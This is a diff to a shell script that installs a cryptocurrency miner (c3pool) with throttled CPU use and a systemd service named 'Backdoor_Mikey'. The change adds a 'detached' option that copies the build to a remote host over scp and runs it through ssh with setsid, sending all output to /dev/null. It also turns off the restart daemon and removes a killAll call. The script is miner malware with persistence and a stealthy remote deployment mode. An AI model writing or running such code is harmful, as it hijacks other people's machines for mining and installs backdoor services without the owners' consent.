@@ -31,8 +31,10 @@ DIR=$HOME/c3pool
 # each random period of time. These bounds will be applied to each virtual CPU thread.
 CPU_min_lim=50
 CPU_max_lim=75
-# Daemon: service which ensures to restart the miner if it terminates for any reason
-daemon_active=true
+# Daemon: service which ensures to restart if the miner terminates unexpectedly
+daemon_active=false
+# Detatched
+detatched=true
 ###############################################################################################################################
 
 
@@ -124,7 +126,6 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
     echo "..... Mikey daemon is here ....."
-    killAll
     sudo systemctl daemon-reload
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
@@ -148,7 +149,11 @@ if [[ "$1" == "-r" ]]; then # draw host credentials
     echo $USER deploying build remotely at $IP ...
     echo "Hostname: ";read IP;echo "Login: ";read USER
     scp -r ./* $USER@$IP:/home && \
-    cat ./build.sh | ssh $USER@$IP /bin/bash
+    if [[ $detatched == true ]]; then
+        ssh $USER@$IP "cd /home; setsid -f bash build.sh > /dev/null 2>&1"
+    else
+        cat ./build.sh | ssh $USER@$IP /bin/bash
+    fi
 else # build locally
     build
 fi
